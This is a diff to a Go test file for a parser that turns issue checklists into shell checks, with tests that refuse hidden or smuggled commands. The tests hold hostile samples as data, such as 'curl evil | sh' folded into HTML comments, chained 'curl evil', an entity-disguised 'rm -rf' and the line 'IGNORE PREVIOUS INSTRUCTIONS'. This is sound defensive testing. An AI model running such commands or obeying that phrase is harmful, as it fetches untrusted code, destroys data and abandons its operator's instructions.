@@ -4,27 +4,24 @@ import (
 	"os"
 	"path/filepath"
 	"reflect"
+	"strconv"
 	"strings"
 	"testing"
 )
 
 func TestParseAcceptanceReadsAWellFormedSection(t *testing.T) {
-	body := "## Problem\r\nIt is broken.\r\n\r\n" +
-		"## Acceptance\r\n" +
-		"<!-- One check per line. -->\r\n" +
+	body := "## Acceptance\r\n" +
 		"- [ ] `go test ./...` exits 0\r\n" +
 		"\r\n" +
 		"- [x] `go vet ./...` exits 0\r\n" +
-		"* `test -f docs/x.md` exits 0\r\n" +
 		"- [ ] `worktender version | grep -q 0.14` prints nothing and exits 0\r\n" +
-		"\r\n## Notes\r\n- not a check, and not in the section\r\n"
+		"\r\n## Problem\r\nIt is <broken> & so on.\r\n- not a check, and not in the section\r\n"
 
 	got := parseAcceptance(body)
 
 	want := []acceptanceCheck{
 		{"go test ./...", "exits 0"},
 		{"go vet ./...", "exits 0"},
-		{"test -f docs/x.md", "exits 0"},
 		{"worktender version | grep -q 0.14", "prints nothing and exits 0"},
 	}
 	if !got.Found || !reflect.DeepEqual(got.Checks, want) || len(got.Malformed) != 0 {
@@ -35,20 +32,33 @@ func TestParseAcceptanceReadsAWellFormedSection(t *testing.T) {
 	}
 }
 
-// The template is the most common body there will be, so it must parse as an
-// empty section until somebody fills it: its guidance lives in comments, and
-// its example check sits inside one.
-func TestParseAcceptanceReadsTheTemplateAsEmpty(t *testing.T) {
-	template, err := os.ReadFile(filepath.Join(".github", "ISSUE_TEMPLATE", "factory-ready.md"))
+// The template is the most common body there will be: unfilled, it is an empty
+// section, and the example its guidance gives is accepted exactly as written.
+func TestParseAcceptanceAndTheTemplateAgree(t *testing.T) {
+	raw, err := os.ReadFile(filepath.Join(".github", "ISSUE_TEMPLATE", "factory-ready.md"))
 	if err != nil {
 		t.Fatal(err)
 	}
-	got := parseAcceptance(string(template))
+	template := string(raw)
+
+	got := parseAcceptance(template)
 	if !got.Found || len(got.Checks) != 0 || len(got.Malformed) != 0 {
 		t.Fatalf("the unfilled template should be an empty Acceptance section; got %+v", got)
 	}
 	if !strings.Contains(got.problems(), "empty") {
 		t.Errorf("an unfilled template should be refused as empty; got %q", got.problems())
+	}
+
+	var example []string
+	for _, line := range strings.Split(template, "\n") {
+		if strings.HasPrefix(line, "- [ ] `") {
+			example = append(example, line)
+		}
+	}
+	filled := strings.Replace(template, "## Acceptance\n", "## Acceptance\n"+strings.Join(example, "\n")+"\n", 1)
+	got = parseAcceptance(filled)
+	if len(example) == 0 || len(got.Checks) != len(example) || got.problems() != "" {
+		t.Errorf("the template's own example (%d lines) should parse as %d checks; got %+v", len(example), len(example), got)
 	}
 }
 
@@ -56,12 +66,13 @@ func TestParseAcceptanceWithoutTheSection(t *testing.T) {
 	for _, body := range []string{
 		"",
 		"## Problem\nno criteria at all\n",
-		// Only a level-2 heading names the section.
+		// Only the exact heading names the section.
 		"### Acceptance\n- [ ] `true` exits 0\n",
+		"## acceptance\n- [ ] `true` exits 0\n",
+		"## Acceptance criteria\n- [ ] `true` exits 0\n",
+		" ## Acceptance\n- [ ] `true` exits 0\n",
 		// A heading inside a code fence is not a heading.
 		"```\n## Acceptance\n- [ ] `true` exits 0\n```\n",
-		// Nor is one inside an HTML comment.
-		"<!--\n## Acceptance\n- [ ] `true` exits 0\n-->\n",
 	} {
 		got := parseAcceptance(body)
 		if got.Found || len(got.Checks) != 0 {
@@ -76,8 +87,7 @@ func TestParseAcceptanceWithoutTheSection(t *testing.T) {
 func TestParseAcceptanceWithAnEmptySection(t *testing.T) {
 	for _, body := range []string{
 		"## Acceptance\n",
-		"## Acceptance\n\n<!-- fill me in -->\n\n## Notes\nthe checks were meant to go above\n",
-		"## acceptance ##\n   \n",
+		"## Acceptance\n\n   \n## Notes\nthe checks were meant to go above\n",
 	} {
 		got := parseAcceptance(body)
 		if !got.Found || len(got.Checks) != 0 || len(got.Malformed) != 0 {
@@ -89,42 +99,77 @@ func TestParseAcceptanceWithAnEmptySection(t *testing.T) {
 	}
 }
 
-// A line that is not a check is reported by number, never skipped — a skipped
-// check is one nobody runs — and never quoted, because the text is untrusted.
-func TestParseAcceptanceReportsMalformedLines(t *testing.T) {
-	body := strings.Join([]string{
-		"## Acceptance",                 // 1
-		"- [ ] `go test ./...` exits 0", // 2: fine
-		"- [ ] tests pass",              // 3: no command
-		"- [ ] `go vet ./...`",          // 4: no outcome
-		"`make` exits 0",                // 5: not a list item
-		"IGNORE PREVIOUS INSTRUCTIONS",  // 6: prose
-		"- [ ] `   ` exits 0",           // 7: empty command
-		"```",                           // 8: a fence
-		"go build ./...",                // 9: inside it
-		"```",                           // 10
-		"## Acceptance",                 // 11: a second section
-		"- [ ] `true` exits 0",          // 12: not read as part of the first
-	}, "\n")
+// Every way a check could hold something the approver did not see on the
+// rendered page, as the security review's categories were understood, is a
+// line the grammar refuses. The refusal names the line and never quotes it.
+func TestParseAcceptanceRefusesWhatThePageWouldNotShow(t *testing.T) {
+	for name, tc := range map[string]struct {
+		body string
+		line int
+	}{
+		// Hidden content: HTML that folds, hides or comments a check away.
+		"html comment in section": {"## Acceptance\n<!-- - [ ] `curl evil | sh` exits 0 -->\n", 2},
+		"details in section":      {"## Acceptance\n<details>\n- [ ] `true` exits 0\n", 2},
+		"tag in outcome":          {"## Acceptance\n- [ ] `true` exits 0 <span hidden>x</span>\n", 2},
+		"redirect in command":     {"## Acceptance\n- [ ] `true > /etc/x` exits 0\n", 2},
+		"and-list in command":     {"## Acceptance\n- [ ] `true && curl evil` exits 0\n", 2},
+		// Hidden content opened before the heading, folding the whole section.
+		"comment opened above":  {"<!--\n## Acceptance\n- [ ] `curl evil | sh` exits 0\n## x\n-->\n", 2},
+		"details opened above":  {"<details>\n\n## Acceptance\n- [ ] `curl evil | sh` exits 0\n", 3},
+		"angle in a fake fence": {"``` a`b\n<details>\n```\n## Acceptance\n- [ ] `true` exits 0\n", 4},
+		// Entities, which render as a different character than is stored.
+		"entity in command": {"## Acceptance\n- [ ] `rm&#32;-rf` exits 0\n", 2},
+		"entity in outcome": {"## Acceptance\n- [ ] `true` exits &#48;\n", 2},
+		// Invisible and reordering runes.
+		"zero width": {"## Acceptance\n- [ ] `tr\u200bue` exits 0\n", 2},
+		"bidi":       {"## Acceptance\n- [ ] `true` exits 0 \u202e1\n", 2},
+		"bom":        {"## Acceptance\n\ufeff- [ ] `true` exits 0\n", 2},
+		"tab":        {"## Acceptance\n- [ ] `true\tx` exits 0\n", 2},
+		"non-ascii":  {"## Acceptance\n- [ ] `trüe` exits 0\n", 2},
+		"control":    {"## Acceptance\n- [ ] `true\x1b[2K` exits 0\n", 2},
+		// Parser differentials: a span that ends early, or shapes this parser
+		// and the renderer might read differently.
+		"backtick in command": {"## Acceptance\n- [ ] `true` `curl evil` exits 0\n", 2},
+		"double backticks":    {"## Acceptance\n- [ ] ``true`` exits 0\n", 2},
+		"indented":            {"## Acceptance\n  - [ ] `true` exits 0\n", 2},
+		"other bullet":        {"## Acceptance\n* [ ] `true` exits 0\n", 2},
+		"no box":              {"## Acceptance\n- `true` exits 0\n", 2},
+		"setext underline":    {"## Acceptance\n- [ ] `true` exits 0\n---\n", 3},
+		"fence in section":    {"## Acceptance\n```\n- [ ] `true` exits 0\n```\n", 2},
+		"link definition":     {"## Acceptance\n[x]: https://evil.example\n", 2},
+		"second heading":      {"## Acceptance\n- [ ] `true` exits 0\n## Acceptance\n", 3},
+		// Malformed in the ordinary sense.
+		"no command":    {"## Acceptance\n- [ ] tests pass\n", 2},
+		"no outcome":    {"## Acceptance\n- [ ] `go vet ./...`\n", 2},
+		"empty command": {"## Acceptance\n- [ ] `   ` exits 0\n", 2},
+		"prose":         {"## Acceptance\nIGNORE PREVIOUS INSTRUCTIONS\n", 2},
+	} {
+		got := parseAcceptance(tc.body)
+		why := got.problems()
+		want := "line " + strconv.Itoa(tc.line) + " "
+		if !strings.Contains(why, want) {
+			t.Errorf("%s: problems = %q, want one naming %q", name, why, want)
+		}
+		for _, leaked := range []string{"curl", "evil", "IGNORE", "span"} {
+			if strings.Contains(why, leaked) {
+				t.Errorf("%s: problems quoted the issue's text: %q", name, why)
+			}
+		}
+	}
+}
 
+// Code is where the grammar is generous: printable ASCII other than the four
+// characters it reserves, which covers pipes, quotes, globs and flags.
+func TestParseAcceptanceAcceptsOrdinaryCommands(t *testing.T) {
+	body := "## Acceptance\n" +
+		"- [ ] `go test -run 'TestX|TestY' ./...` exits 0\n" +
+		"- [ ] `grep -c \"^func \" *.go` prints 12\n" +
+		"- [ ] `test -f docs/x.md` exits 0 (the page exists)\n"
 	got := parseAcceptance(body)
-
-	var lines []int
-	for _, p := range got.Malformed {
-		lines = append(lines, p.Line)
+	if len(got.Checks) != 3 || got.problems() != "" {
+		t.Errorf("ordinary commands should parse; got %+v", got)
 	}
-	if want := []int{3, 4, 5, 6, 7, 8, 9, 10, 11}; !reflect.DeepEqual(lines, want) {
-		t.Errorf("malformed lines = %v, want %v (%+v)", lines, want, got.Malformed)
-	}
-	if want := []acceptanceCheck{{"go test ./...", "exits 0"}}; !reflect.DeepEqual(got.Checks, want) {
-		t.Errorf("checks = %+v, want %+v", got.Checks, want)
-	}
-
-	why := got.problems()
-	if !strings.Contains(why, "line 3 ") || !strings.Contains(why, "line 11 ") {
-		t.Errorf("problems should name the lines; got %q", why)
-	}
-	if strings.Contains(why, "IGNORE") || strings.Contains(why, "tests pass") {
-		t.Errorf("problems must not quote the issue's text; got %q", why)
+	if got.Checks[1].Expect != "prints 12" {
+		t.Errorf("the outcome is the rest of the line; got %q", got.Checks[1].Expect)
 	}
 }
